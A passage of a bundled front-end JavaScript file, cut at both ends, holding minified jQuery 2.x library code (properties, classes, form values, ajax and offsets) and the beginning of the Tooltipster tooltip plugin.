                        return a.setAttribute("type", b), c && (a.value = c), b
                    }
                }
            }
        }
    }), Za = {
        set: function(a, b, c) {
            return b === !1 ? n.removeAttr(a, c) : a.setAttribute(c, c), c
        }
    }, n.each(n.expr.match.bool.source.match(/\w+/g), function(a, b) {
        var c = $a[b] || n.find.attr;
        $a[b] = function(a, b, d) {
            var e, f;
            return d || (f = $a[b], $a[b] = e, e = null != c(a, b, d) ? b.toLowerCase() : null, $a[b] = f), e
        }
    });
    var _a = /^(?:input|select|textarea|button)$/i;
    n.fn.extend({
        prop: function(a, b) {
            return J(this, n.prop, a, b, arguments.length > 1)
        },
        removeProp: function(a) {
            return this.each(function() {
                delete this[n.propFix[a] || a]
            })
        }
    }), n.extend({
        propFix: {
            "for": "htmlFor",
            "class": "className"
        },
        prop: function(a, b, c) {
            var d, e, f, g = a.nodeType;
            if (a && 3 !== g && 8 !== g && 2 !== g) {
                return f = 1 !== g || !n.isXMLDoc(a), f && (b = n.propFix[b] || b, e = n.propHooks[b]), void 0 !== c ? e && "set" in e && void 0 !== (d = e.set(a, c, b)) ? d : a[b] = c : e && "get" in e && null !== (d = e.get(a, b)) ? d : a[b]
            }
        },
        propHooks: {
            tabIndex: {
                get: function(a) {
                    return a.hasAttribute("tabindex") || _a.test(a.nodeName) || a.href ? a.tabIndex : -1
                }
            }
        }
    }), k.optSelected || (n.propHooks.selected = {
        get: function(a) {
            var b = a.parentNode;
            return b && b.parentNode && b.parentNode.selectedIndex, null
        }
    }), n.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        n.propFix[this.toLowerCase()] = this
    });
    var ab = /[\t\r\n\f]/g;
    n.fn.extend({
        addClass: function(a) {
            var b, c, d, e, f, g, h = "string" == typeof a && a,
                i = 0,
                j = this.length;
            if (n.isFunction(a)) {
                return this.each(function(b) {
                    n(this).addClass(a.call(this, b, this.className))
                })
            }
            if (h) {
                for (b = (a || "").match(E) || []; j > i; i++) {
                    if (c = this[i], d = 1 === c.nodeType && (c.className ? (" " + c.className + " ").replace(ab, " ") : " ")) {
                        f = 0;
                        while (e = b[f++]) {
                            d.indexOf(" " + e + " ") < 0 && (d += e + " ")
                        }
                        g = n.trim(d), c.className !== g && (c.className = g)
                    }
                }
            }
            return this
        },
        removeClass: function(a) {
            var b, c, d, e, f, g, h = 0 === arguments.length || "string" == typeof a && a,
                i = 0,
                j = this.length;
            if (n.isFunction(a)) {
                return this.each(function(b) {
                    n(this).removeClass(a.call(this, b, this.className))
                })
            }
            if (h) {
                for (b = (a || "").match(E) || []; j > i; i++) {
                    if (c = this[i], d = 1 === c.nodeType && (c.className ? (" " + c.className + " ").replace(ab, " ") : "")) {
                        f = 0;
                        while (e = b[f++]) {
                            while (d.indexOf(" " + e + " ") >= 0) {
                                d = d.replace(" " + e + " ", " ")
                            }
                        }
                        g = a ? n.trim(d) : "", c.className !== g && (c.className = g)
                    }
                }
            }
            return this
        },
        toggleClass: function(a, b) {
            var c = typeof a;
            return "boolean" == typeof b && "string" === c ? b ? this.addClass(a) : this.removeClass(a) : this.each(n.isFunction(a) ? function(c) {
                n(this).toggleClass(a.call(this, c, this.className, b), b)
            } : function() {
                if ("string" === c) {
                    var b, d = 0,
                        e = n(this),
                        f = a.match(E) || [];
                    while (b = f[d++]) {
                        e.hasClass(b) ? e.removeClass(b) : e.addClass(b)
                    }
                } else {
                    (c === U || "boolean" === c) && (this.className && L.set(this, "__className__", this.className), this.className = this.className || a === !1 ? "" : L.get(this, "__className__") || "")
                }
            })
        },
        hasClass: function(a) {
            for (var b = " " + a + " ", c = 0, d = this.length; d > c; c++) {
                if (1 === this[c].nodeType && (" " + this[c].className + " ").replace(ab, " ").indexOf(b) >= 0) {
                    return !0
                }
            }
            return !1
        }
    });
    var bb = /\r/g;
    n.fn.extend({
        val: function(a) {
            var b, c, d, e = this[0];
            if (arguments.length) {
                return d = n.isFunction(a), this.each(function(c) {
                    var e;
                    1 === this.nodeType && (e = d ? a.call(this, c, n(this).val()) : a, null == e ? e = "" : "number" == typeof e ? e += "" : n.isArray(e) && (e = n.map(e, function(a) {
                        return null == a ? "" : a + ""
                    })), b = n.valHooks[this.type] || n.valHooks[this.nodeName.toLowerCase()], b && "set" in b && void 0 !== b.set(this, e, "value") || (this.value = e))
                })
            }
            if (e) {
                return b = n.valHooks[e.type] || n.valHooks[e.nodeName.toLowerCase()], b && "get" in b && void 0 !== (c = b.get(e, "value")) ? c : (c = e.value, "string" == typeof c ? c.replace(bb, "") : null == c ? "" : c)
            }
        }
    }), n.extend({
        valHooks: {
            option: {
                get: function(a) {
                    var b = n.find.attr(a, "value");
                    return null != b ? b : n.trim(n.text(a))
                }
            },
            select: {
                get: function(a) {
                    for (var b, c, d = a.options, e = a.selectedIndex, f = "select-one" === a.type || 0 > e, g = f ? null : [], h = f ? e + 1 : d.length, i = 0 > e ? h : f ? e : 0; h > i; i++) {
                        if (c = d[i], !(!c.selected && i !== e || (k.optDisabled ? c.disabled : null !== c.getAttribute("disabled")) || c.parentNode.disabled && n.nodeName(c.parentNode, "optgroup"))) {
                            if (b = n(c).val(), f) {
                                return b
                            }
                            g.push(b)
                        }
                    }
                    return g
                },
                set: function(a, b) {
                    var c, d, e = a.options,
                        f = n.makeArray(b),
                        g = e.length;
                    while (g--) {
                        d = e[g], (d.selected = n.inArray(d.value, f) >= 0) && (c = !0)
                    }
                    return c || (a.selectedIndex = -1), f
                }
            }
        }
    }), n.each(["radio", "checkbox"], function() {
        n.valHooks[this] = {
            set: function(a, b) {
                return n.isArray(b) ? a.checked = n.inArray(n(a).val(), b) >= 0 : void 0
            }
        }, k.checkOn || (n.valHooks[this].get = function(a) {
            return null === a.getAttribute("value") ? "on" : a.value
        })
    }), n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(a, b) {
        n.fn[b] = function(a, c) {
            return arguments.length > 0 ? this.on(b, null, a, c) : this.trigger(b)
        }
    }), n.fn.extend({
        hover: function(a, b) {
            return this.mouseenter(a).mouseleave(b || a)
        },
        bind: function(a, b, c) {
            return this.on(a, null, b, c)
        },
        unbind: function(a, b) {
            return this.off(a, null, b)
        },
        delegate: function(a, b, c, d) {
            return this.on(b, a, c, d)
        },
        undelegate: function(a, b, c) {
            return 1 === arguments.length ? this.off(a, "**") : this.off(b, a || "**", c)
        }
    });
    var cb = n.now(),
        db = /\?/;
    n.parseJSON = function(a) {
        return JSON.parse(a + "")
    }, n.parseXML = function(a) {
        var b, c;
        if (!a || "string" != typeof a) {
            return null
        }
        try {
            c = new DOMParser, b = c.parseFromString(a, "text/xml")
        } catch (d) {
            b = void 0
        }
        return (!b || b.getElementsByTagName("parsererror").length) && n.error("Invalid XML: " + a), b
    };
    var eb = /#.*$/,
        fb = /([?&])_=[^&]*/,
        gb = /^(.*?):[ \t]*([^\r\n]*)$/gm,
        hb = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
        ib = /^(?:GET|HEAD)$/,
        jb = /^\/\//,
        kb = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
        lb = {},
        mb = {},
        nb = "*/".concat("*"),
        ob = a.location.href,
        pb = kb.exec(ob.toLowerCase()) || [];

    function qb(a) {
        return function(b, c) {
            "string" != typeof b && (c = b, b = "*");
            var d, e = 0,
                f = b.toLowerCase().match(E) || [];
            if (n.isFunction(c)) {
                while (d = f[e++]) {
                    "+" === d[0] ? (d = d.slice(1) || "*", (a[d] = a[d] || []).unshift(c)) : (a[d] = a[d] || []).push(c)
                }
            }
        }
    }

    function rb(a, b, c, d) {
        var e = {},
            f = a === mb;

        function g(h) {
            var i;
            return e[h] = !0, n.each(a[h] || [], function(a, h) {
                var j = h(b, c, d);
                return "string" != typeof j || f || e[j] ? f ? !(i = j) : void 0 : (b.dataTypes.unshift(j), g(j), !1)
            }), i
        }
        return g(b.dataTypes[0]) || !e["*"] && g("*")
    }

    function sb(a, b) {
        var c, d, e = n.ajaxSettings.flatOptions || {};
        for (c in b) {
            void 0 !== b[c] && ((e[c] ? a : d || (d = {}))[c] = b[c])
        }
        return d && n.extend(!0, a, d), a
    }

    function tb(a, b, c) {
        var d, e, f, g, h = a.contents,
            i = a.dataTypes;
        while ("*" === i[0]) {
            i.shift(), void 0 === d && (d = a.mimeType || b.getResponseHeader("Content-Type"))
        }
        if (d) {
            for (e in h) {
                if (h[e] && h[e].test(d)) {
                    i.unshift(e);
                    break
                }
            }
        }
        if (i[0] in c) {
            f = i[0]
        } else {
            for (e in c) {
                if (!i[0] || a.converters[e + " " + i[0]]) {
                    f = e;
                    break
                }
                g || (g = e)
            }
            f = f || g
        }
        return f ? (f !== i[0] && i.unshift(f), c[f]) : void 0
    }

    function ub(a, b, c, d) {
        var e, f, g, h, i, j = {},
            k = a.dataTypes.slice();
        if (k[1]) {
            for (g in a.converters) {
                j[g.toLowerCase()] = a.converters[g]
            }
        }
        f = k.shift();
        while (f) {
            if (a.responseFields[f] && (c[a.responseFields[f]] = b), !i && d && a.dataFilter && (b = a.dataFilter(b, a.dataType)), i = f, f = k.shift()) {
                if ("*" === f) {
                    f = i
                } else {
                    if ("*" !== i && i !== f) {
                        if (g = j[i + " " + f] || j["* " + f], !g) {
                            for (e in j) {
                                if (h = e.split(" "), h[1] === f && (g = j[i + " " + h[0]] || j["* " + h[0]])) {
                                    g === !0 ? g = j[e] : j[e] !== !0 && (f = h[0], k.unshift(h[1]));
                                    break
                                }
                            }
                        }
                        if (g !== !0) {
                            if (g && a["throws"]) {
                                b = g(b)
                            } else {
                                try {
                                    b = g(b)
                                } catch (l) {
                                    return {
                                        state: "parsererror",
                                        error: g ? l : "No conversion from " + i + " to " + f
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        return {
            state: "success",
            data: b
        }
    }
    n.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: ob,
            type: "GET",
            isLocal: hb.test(pb[1]),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": nb,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /xml/,
                html: /html/,
                json: /json/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": n.parseJSON,
                "text xml": n.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(a, b) {
            return b ? sb(sb(a, n.ajaxSettings), b) : sb(n.ajaxSettings, a)
        },
        ajaxPrefilter: qb(lb),
        ajaxTransport: qb(mb),
        ajax: function(a, b) {
            "object" == typeof a && (b = a, a = void 0), b = b || {};
            var c, d, e, f, g, h, i, j, k = n.ajaxSetup({}, b),
                l = k.context || k,
                m = k.context && (l.nodeType || l.jquery) ? n(l) : n.event,
                o = n.Deferred(),
                p = n.Callbacks("once memory"),
                q = k.statusCode || {},
                r = {},
                s = {},
                t = 0,
                u = "canceled",
                v = {
                    readyState: 0,
                    getResponseHeader: function(a) {
                        var b;
                        if (2 === t) {
                            if (!f) {
                                f = {};
                                while (b = gb.exec(e)) {
                                    f[b[1].toLowerCase()] = b[2]
                                }
                            }
                            b = f[a.toLowerCase()]
                        }
                        return null == b ? null : b
                    },
                    getAllResponseHeaders: function() {
                        return 2 === t ? e : null
                    },
                    setRequestHeader: function(a, b) {
                        var c = a.toLowerCase();
                        return t || (a = s[c] = s[c] || a, r[a] = b), this
                    },
                    overrideMimeType: function(a) {
                        return t || (k.mimeType = a), this
                    },
                    statusCode: function(a) {
                        var b;
                        if (a) {
                            if (2 > t) {
                                for (b in a) {
                                    q[b] = [q[b], a[b]]
                                }
                            } else {
                                v.always(a[v.status])
                            }
                        }
                        return this
                    },
                    abort: function(a) {
                        var b = a || u;
                        return c && c.abort(b), x(0, b), this
                    }
                };
            if (o.promise(v).complete = p.add, v.success = v.done, v.error = v.fail, k.url = ((a || k.url || ob) + "").replace(eb, "").replace(jb, pb[1] + "//"), k.type = b.method || b.type || k.method || k.type, k.dataTypes = n.trim(k.dataType || "*").toLowerCase().match(E) || [""], null == k.crossDomain && (h = kb.exec(k.url.toLowerCase()), k.crossDomain = !(!h || h[1] === pb[1] && h[2] === pb[2] && (h[3] || ("http:" === h[1] ? "80" : "443")) === (pb[3] || ("http:" === pb[1] ? "80" : "443")))), k.data && k.processData && "string" != typeof k.data && (k.data = n.param(k.data, k.traditional)), rb(lb, k, b, v), 2 === t) {
                return v
            }
            i = n.event && k.global, i && 0 === n.active++ && n.event.trigger("ajaxStart"), k.type = k.type.toUpperCase(), k.hasContent = !ib.test(k.type), d = k.url, k.hasContent || (k.data && (d = k.url += (db.test(d) ? "&" : "?") + k.data, delete k.data), k.cache === !1 && (k.url = fb.test(d) ? d.replace(fb, "$1_=" + cb++) : d + (db.test(d) ? "&" : "?") + "_=" + cb++)), k.ifModified && (n.lastModified[d] && v.setRequestHeader("If-Modified-Since", n.lastModified[d]), n.etag[d] && v.setRequestHeader("If-None-Match", n.etag[d])), (k.data && k.hasContent && k.contentType !== !1 || b.contentType) && v.setRequestHeader("Content-Type", k.contentType), v.setRequestHeader("Accept", k.dataTypes[0] && k.accepts[k.dataTypes[0]] ? k.accepts[k.dataTypes[0]] + ("*" !== k.dataTypes[0] ? ", " + nb + "; q=0.01" : "") : k.accepts["*"]);
            for (j in k.headers) {
                v.setRequestHeader(j, k.headers[j])
            }
            if (k.beforeSend && (k.beforeSend.call(l, v, k) === !1 || 2 === t)) {
                return v.abort()
            }
            u = "abort";
            for (j in {
                    success: 1,
                    error: 1,
                    complete: 1
                }) {
                v[j](k[j])
            }
            if (c = rb(mb, k, b, v)) {
                v.readyState = 1, i && m.trigger("ajaxSend", [v, k]), k.async && k.timeout > 0 && (g = setTimeout(function() {
                    v.abort("timeout")
                }, k.timeout));
                try {
                    t = 1, c.send(r, x)
                } catch (w) {
                    if (!(2 > t)) {
                        throw w
                    }
                    x(-1, w)
                }
            } else {
                x(-1, "No Transport")
            }

            function x(a, b, f, h) {
                var j, r, s, u, w, x = b;
                2 !== t && (t = 2, g && clearTimeout(g), c = void 0, e = h || "", v.readyState = a > 0 ? 4 : 0, j = a >= 200 && 300 > a || 304 === a, f && (u = tb(k, v, f)), u = ub(k, u, v, j), j ? (k.ifModified && (w = v.getResponseHeader("Last-Modified"), w && (n.lastModified[d] = w), w = v.getResponseHeader("etag"), w && (n.etag[d] = w)), 204 === a || "HEAD" === k.type ? x = "nocontent" : 304 === a ? x = "notmodified" : (x = u.state, r = u.data, s = u.error, j = !s)) : (s = x, (a || !x) && (x = "error", 0 > a && (a = 0))), v.status = a, v.statusText = (b || x) + "", j ? o.resolveWith(l, [r, x, v]) : o.rejectWith(l, [v, x, s]), v.statusCode(q), q = void 0, i && m.trigger(j ? "ajaxSuccess" : "ajaxError", [v, k, j ? r : s]), p.fireWith(l, [v, x]), i && (m.trigger("ajaxComplete", [v, k]), --n.active || n.event.trigger("ajaxStop")))
            }
            return v
        },
        getJSON: function(a, b, c) {
            return n.get(a, b, c, "json")
        },
        getScript: function(a, b) {
            return n.get(a, void 0, b, "script")
        }
    }), n.each(["get", "post"], function(a, b) {
        n[b] = function(a, c, d, e) {
            return n.isFunction(c) && (e = e || d, d = c, c = void 0), n.ajax({
                url: a,
                type: b,
                dataType: e,
                data: c,
                success: d
            })
        }
    }), n._evalUrl = function(a) {
        return n.ajax({
            url: a,
            type: "GET",
            dataType: "script",
            async: !1,
            global: !1,
            "throws": !0
        })
    }, n.fn.extend({
        wrapAll: function(a) {
            var b;
            return n.isFunction(a) ? this.each(function(b) {
                n(this).wrapAll(a.call(this, b))
            }) : (this[0] && (b = n(a, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && b.insertBefore(this[0]), b.map(function() {
                var a = this;
                while (a.firstElementChild) {
                    a = a.firstElementChild
                }
                return a
            }).append(this)), this)
        },
        wrapInner: function(a) {
            return this.each(n.isFunction(a) ? function(b) {
                n(this).wrapInner(a.call(this, b))
            } : function() {
                var b = n(this),
                    c = b.contents();
                c.length ? c.wrapAll(a) : b.append(a)
            })
        },
        wrap: function(a) {
            var b = n.isFunction(a);
            return this.each(function(c) {
                n(this).wrapAll(b ? a.call(this, c) : a)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                n.nodeName(this, "body") || n(this).replaceWith(this.childNodes)
            }).end()
        }
    }), n.expr.filters.hidden = function(a) {
        return a.offsetWidth <= 0 && a.offsetHeight <= 0
    }, n.expr.filters.visible = function(a) {
        return !n.expr.filters.hidden(a)
    };
    var vb = /%20/g,
        wb = /\[\]$/,
        xb = /\r?\n/g,
        yb = /^(?:submit|button|image|reset|file)$/i,
        zb = /^(?:input|select|textarea|keygen)/i;

    function Ab(a, b, c, d) {
        var e;
        if (n.isArray(b)) {
            n.each(b, function(b, e) {
                c || wb.test(a) ? d(a, e) : Ab(a + "[" + ("object" == typeof e ? b : "") + "]", e, c, d)
            })
        } else {
            if (c || "object" !== n.type(b)) {
                d(a, b)
            } else {
                for (e in b) {
                    Ab(a + "[" + e + "]", b[e], c, d)
                }
            }
        }
    }
    n.param = function(a, b) {
        var c, d = [],
            e = function(a, b) {
                b = n.isFunction(b) ? b() : null == b ? "" : b, d[d.length] = encodeURIComponent(a) + "=" + encodeURIComponent(b)
            };
        if (void 0 === b && (b = n.ajaxSettings && n.ajaxSettings.traditional), n.isArray(a) || a.jquery && !n.isPlainObject(a)) {
            n.each(a, function() {
                e(this.name, this.value)
            })
        } else {
            for (c in a) {
                Ab(c, a[c], b, e)
            }
        }
        return d.join("&").replace(vb, "+")
    }, n.fn.extend({
        serialize: function() {
            return n.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                var a = n.prop(this, "elements");
                return a ? n.makeArray(a) : this
            }).filter(function() {
                var a = this.type;
                return this.name && !n(this).is(":disabled") && zb.test(this.nodeName) && !yb.test(a) && (this.checked || !T.test(a))
            }).map(function(a, b) {
                var c = n(this).val();
                return null == c ? null : n.isArray(c) ? n.map(c, function(a) {
                    return {
                        name: b.name,
                        value: a.replace(xb, "\r\n")
                    }
                }) : {
                    name: b.name,
                    value: c.replace(xb, "\r\n")
                }
            }).get()
        }
    }), n.ajaxSettings.xhr = function() {
        try {
            return new XMLHttpRequest
        } catch (a) {}
    };
    var Bb = 0,
        Cb = {},
        Db = {
            0: 200,
            1223: 204
        },
        Eb = n.ajaxSettings.xhr();
    a.attachEvent && a.attachEvent("onunload", function() {
        for (var a in Cb) {
            Cb[a]()
        }
    }), k.cors = !!Eb && "withCredentials" in Eb, k.ajax = Eb = !!Eb, n.ajaxTransport(function(a) {
        var b;
        return k.cors || Eb && !a.crossDomain ? {
            send: function(c, d) {
                var e, f = a.xhr(),
                    g = ++Bb;
                if (f.open(a.type, a.url, a.async, a.username, a.password), a.xhrFields) {
                    for (e in a.xhrFields) {
                        f[e] = a.xhrFields[e]
                    }
                }
                a.mimeType && f.overrideMimeType && f.overrideMimeType(a.mimeType), a.crossDomain || c["X-Requested-With"] || (c["X-Requested-With"] = "XMLHttpRequest");
                for (e in c) {
                    f.setRequestHeader(e, c[e])
                }
                b = function(a) {
                    return function() {
                        b && (delete Cb[g], b = f.onload = f.onerror = null, "abort" === a ? f.abort() : "error" === a ? d(f.status, f.statusText) : d(Db[f.status] || f.status, f.statusText, "string" == typeof f.responseText ? {
                            text: f.responseText
                        } : void 0, f.getAllResponseHeaders()))
                    }
                }, f.onload = b(), f.onerror = b("error"), b = Cb[g] = b("abort");
                try {
                    f.send(a.hasContent && a.data || null)
                } catch (h) {
                    if (b) {
                        throw h
                    }
                }
            },
            abort: function() {
                b && b()
            }
        } : void 0
    }), n.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /(?:java|ecma)script/
        },
        converters: {
            "text script": function(a) {
                return n.globalEval(a), a
            }
        }
    }), n.ajaxPrefilter("script", function(a) {
        void 0 === a.cache && (a.cache = !1), a.crossDomain && (a.type = "GET")
    }), n.ajaxTransport("script", function(a) {
        if (a.crossDomain) {
            var b, c;
            return {
                send: function(d, e) {
                    b = n("<script>").prop({
                        async: !0,
                        charset: a.scriptCharset,
                        src: a.url
                    }).on("load error", c = function(a) {
                        b.remove(), c = null, a && e("error" === a.type ? 404 : 200, a.type)
                    }), l.head.appendChild(b[0])
                },
                abort: function() {
                    c && c()
                }
            }
        }
    });
    var Fb = [],
        Gb = /(=)\?(?=&|$)|\?\?/;
    n.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var a = Fb.pop() || n.expando + "_" + cb++;
            return this[a] = !0, a
        }
    }), n.ajaxPrefilter("json jsonp", function(b, c, d) {
        var e, f, g, h = b.jsonp !== !1 && (Gb.test(b.url) ? "url" : "string" == typeof b.data && !(b.contentType || "").indexOf("application/x-www-form-urlencoded") && Gb.test(b.data) && "data");
        return h || "jsonp" === b.dataTypes[0] ? (e = b.jsonpCallback = n.isFunction(b.jsonpCallback) ? b.jsonpCallback() : b.jsonpCallback, h ? b[h] = b[h].replace(Gb, "$1" + e) : b.jsonp !== !1 && (b.url += (db.test(b.url) ? "&" : "?") + b.jsonp + "=" + e), b.converters["script json"] = function() {
            return g || n.error(e + " was not called"), g[0]
        }, b.dataTypes[0] = "json", f = a[e], a[e] = function() {
            g = arguments
        }, d.always(function() {
            a[e] = f, b[e] && (b.jsonpCallback = c.jsonpCallback, Fb.push(e)), g && n.isFunction(f) && f(g[0]), g = f = void 0
        }), "script") : void 0
    }), n.parseHTML = function(a, b, c) {
        if (!a || "string" != typeof a) {
            return null
        }
        "boolean" == typeof b && (c = b, b = !1), b = b || l;
        var d = v.exec(a),
            e = !c && [];
        return d ? [b.createElement(d[1])] : (d = n.buildFragment([a], b, e), e && e.length && n(e).remove(), n.merge([], d.childNodes))
    };
    var Hb = n.fn.load;
    n.fn.load = function(a, b, c) {
        if ("string" != typeof a && Hb) {
            return Hb.apply(this, arguments)
        }
        var d, e, f, g = this,
            h = a.indexOf(" ");
        return h >= 0 && (d = n.trim(a.slice(h)), a = a.slice(0, h)), n.isFunction(b) ? (c = b, b = void 0) : b && "object" == typeof b && (e = "POST"), g.length > 0 && n.ajax({
            url: a,
            type: e,
            dataType: "html",
            data: b
        }).done(function(a) {
            f = arguments, g.html(d ? n("<div>").append(n.parseHTML(a)).find(d) : a)
        }).complete(c && function(a, b) {
            g.each(c, f || [a.responseText, b, a])
        }), this
    }, n.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(a, b) {
        n.fn[b] = function(a) {
            return this.on(b, a)
        }
    }), n.expr.filters.animated = function(a) {
        return n.grep(n.timers, function(b) {
            return a === b.elem
        }).length
    };
    var Ib = a.document.documentElement;

    function Jb(a) {
        return n.isWindow(a) ? a : 9 === a.nodeType && a.defaultView
    }
    n.offset = {
        setOffset: function(a, b, c) {
            var d, e, f, g, h, i, j, k = n.css(a, "position"),
                l = n(a),
                m = {};
            "static" === k && (a.style.position = "relative"), h = l.offset(), f = n.css(a, "top"), i = n.css(a, "left"), j = ("absolute" === k || "fixed" === k) && (f + i).indexOf("auto") > -1, j ? (d = l.position(), g = d.top, e = d.left) : (g = parseFloat(f) || 0, e = parseFloat(i) || 0), n.isFunction(b) && (b = b.call(a, c, h)), null != b.top && (m.top = b.top - h.top + g), null != b.left && (m.left = b.left - h.left + e), "using" in b ? b.using.call(a, m) : l.css(m)
        }
    }, n.fn.extend({
        offset: function(a) {
            if (arguments.length) {
                return void 0 === a ? this : this.each(function(b) {
                    n.offset.setOffset(this, a, b)
                })
            }
            var b, c, d = this[0],
                e = {
                    top: 0,
                    left: 0
                },
                f = d && d.ownerDocument;
            if (f) {
                return b = f.documentElement, n.contains(b, d) ? (typeof d.getBoundingClientRect !== U && (e = d.getBoundingClientRect()), c = Jb(f), {
                    top: e.top + c.pageYOffset - b.clientTop,
                    left: e.left + c.pageXOffset - b.clientLeft
                }) : e
            }
        },
        position: function() {
            if (this[0]) {
                var a, b, c = this[0],
                    d = {
                        top: 0,
                        left: 0
                    };
                return "fixed" === n.css(c, "position") ? b = c.getBoundingClientRect() : (a = this.offsetParent(), b = this.offset(), n.nodeName(a[0], "html") || (d = a.offset()), d.top += n.css(a[0], "borderTopWidth", !0), d.left += n.css(a[0], "borderLeftWidth", !0)), {
                    top: b.top - d.top - n.css(c, "marginTop", !0),
                    left: b.left - d.left - n.css(c, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                var a = this.offsetParent || Ib;
                while (a && !n.nodeName(a, "html") && "static" === n.css(a, "position")) {
                    a = a.offsetParent
                }
                return a || Ib
            })
        }
    }), n.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(b, c) {
        var d = "pageYOffset" === c;
        n.fn[b] = function(e) {
            return J(this, function(b, e, f) {
                var g = Jb(b);
                return void 0 === f ? g ? g[c] : b[e] : void(g ? g.scrollTo(d ? a.pageXOffset : f, d ? f : a.pageYOffset) : b[e] = f)
            }, b, e, arguments.length, null)
        }
    }), n.each(["top", "left"], function(a, b) {
        n.cssHooks[b] = ya(k.pixelPosition, function(a, c) {
            return c ? (c = xa(a, b), va.test(c) ? n(a).position()[b] + "px" : c) : void 0
        })
    }), n.each({
        Height: "height",
        Width: "width"
    }, function(a, b) {
        n.each({
            padding: "inner" + a,
            content: b,
            "": "outer" + a
        }, function(c, d) {
            n.fn[d] = function(d, e) {
                var f = arguments.length && (c || "boolean" != typeof d),
                    g = c || (d === !0 || e === !0 ? "margin" : "border");
                return J(this, function(b, c, d) {
                    var e;
                    return n.isWindow(b) ? b.document.documentElement["client" + a] : 9 === b.nodeType ? (e = b.documentElement, Math.max(b.body["scroll" + a], e["scroll" + a], b.body["offset" + a], e["offset" + a], e["client" + a])) : void 0 === d ? n.css(b, c, g) : n.style(b, c, d, g)
                }, b, f ? d : void 0, f, null)
            }
        })
    }), n.fn.size = function() {
        return this.length
    }, n.fn.andSelf = n.fn.addBack, "function" == typeof define && define.amd && define("jquery", [], function() {
        return n
    });
    var Kb = a.jQuery,
        Lb = a.$;
    return n.noConflict = function(b) {
        return a.$ === n && (a.$ = Lb), b && a.jQuery === n && (a.jQuery = Kb), n
    }, typeof b === U && (a.jQuery = a.$ = n), n
});
(function(k, q, d) {
    function w(a, e) {
        this.bodyOverflowX;
        this.callbacks = {
            hide: [],
            show: []
        };
        this.checkInterval = null;
        this.Content;
        this.$el = k(a);
        this.$elProxy;
        this.elProxyPosition;
        this.enabled = true;
        this.options = k.extend({}, h, e);
        this.mouseIsOverProxy = false;
        this.namespace = "tooltipster-" + Math.round(Math.random() * 100000);
        this.Status = "hidden";
        this.timerHide = null;
        this.timerShow = null;
        this.$tooltip;
        this.options.iconTheme = this.options.iconTheme.replace(".", "");
        this.options.theme = this.options.theme.replace(".", "");
        this._init()
    }

    function c(a, f) {
        var e = true;
        k.each(a, function(n, l) {
            if (typeof f[n] === "undefined" || a[n] !== f[n]) {
                e = false;
                return false
            }
        });
        return e
    }

    function j() {
        return !m && p
    }

    function g() {
        var n = d.body || d.documentElement,
            f = n.style,
            l = "transition";
        if (typeof f[l] == "string") {
            return true
        }
        v = ["Moz", "Webkit", "Khtml", "O", "ms"], l = l.charAt(0).toUpperCase() + l.substr(1);
        for (var a = 0; a < v.length; a++) {
            if (typeof f[v[a] + l] == "string") {
                return true
            }
        }
        return false
    }
    var b = "tooltipster",
        h = {
            animation: "fade",
            arrow: true,
            arrowColor: "",
            autoClose: true,
            content: null,
            contentAsHTML: false,
            contentCloning: true,
            debug: true,
            delay: 200,
            minWidth: 0,
            maxWidth: null,
            functionInit: function(f, a) {},
            functionBefore: function(f, a) {
                a()
            },
            functionReady: function(f, a) {},
            functionAfter: function(a) {},
            hideOnClick: false,
            icon: "(?)",
            iconCloning: true,
            iconDesktop: false,
            iconTouch: false,
            iconTheme: "tooltipster-icon",
            interactive: false,
            interactiveTolerance: 350,
            multiple: false,
            offsetX: 0,
            offsetY: 0,
            onlyOne: false,
            position: "top",
            positionTracker: false,
            positionTrackerCallback: function(a) {
                if (this.option("trigger") == "hover" && this.option("autoClose")) {
                    this.hide()
                }
            },
            restoration: "current",
            speed: 350,
            timer: 0,
            theme: "tooltipster-default",
            touchDevices: true,
            trigger: "hover",
            updateAnimation: true
        };
    w.prototype = {
        _init: function() {
            var e = this;
            if (d.querySelector) {
                var f = null;
                if (e.$el.data("tooltipster-initialTitle") === undefined) {
                    f = e.$el.attr("title");
                    if (f === undefined) {
                        f = null
                    }
                    e.$el.data("tooltipster-initialTitle", f)
                }
                if (e.options.content !== null) {
                    e._content_set(e.options.content)
                } else {
                    e._content_set(f)
                }
                var a = e.options.functionInit.call(e.$el, e.$el, e.Content);
                if (typeof a !== "undefined") {
                    e._content_set(a)
                }
                e.$el.removeAttr("title").addClass("tooltipstered");
                if (!p && e.options.iconDesktop || p && e.options.iconTouch) {
                    if (typeof e.options.icon === "string") {
                        e.$elProxy = k('<span class="' + e.options.iconTheme + '"></span>');
                        e.$elProxy.text(e.options.icon)
                    } else {
                        if (e.options.iconCloning) {
                            e.$elProxy = e.options.icon.clone(true)
                        } else {
                            e.$elProxy = e.options.icon
                        }
                    }
                    e.$elProxy.insertAfter(e.$el)
                } else {
                    e.$elProxy = e.$el
                }
                if (e.options.trigger == "hover") {
